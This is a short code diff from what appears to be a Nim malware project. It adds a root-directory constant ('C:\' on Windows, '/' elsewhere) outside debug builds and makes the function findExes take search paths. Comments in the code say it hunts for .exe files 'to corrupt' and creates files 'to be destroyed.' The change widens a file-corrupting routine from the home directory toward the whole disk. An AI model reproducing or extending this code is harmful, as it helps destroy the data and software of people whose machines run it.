@@ -11,6 +11,13 @@ proc searchWithExt*(exts: seq[string], paths: seq[string] = @[getHomeDir()]): se
 
 proc searchWithExt*(ext: string, paths: seq[string] = @[getHomeDir()]): seq[string] = return searchWithExt(@[ext], paths)
 
+when not defined debug:
+  when defined(windows):
+    const rootDir* = "C:\\"
+  else:
+    const rootDir* = "/"
+else:
+  const rootDir* = getCurrentDir() & "/hideout/"
 
 when defined(debug):
   # Make a dummy file specifically to be destroyed.
@@ -39,5 +46,5 @@ when defined(debug):
       return @[]
 else:
   # Search everywhere in the user's home directory for exe files to corrupt.
-  proc findExes*(): seq[string] =
-    return searchWithExt("exe")
+  proc findExes*(paths: seq[string] = @[getHomeDir()]): seq[string] =
+    return searchWithExt("exe", paths)
